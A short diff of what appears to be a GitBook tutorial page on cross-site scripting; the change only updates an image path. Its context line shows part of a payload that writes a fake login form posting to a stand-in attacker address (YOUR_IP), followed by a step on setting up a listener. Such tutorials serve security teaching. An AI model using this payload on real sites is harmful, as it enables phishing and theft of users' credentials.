@@ -72,7 +72,7 @@ document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP><in
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Step 5: Setting Up the Listener
 
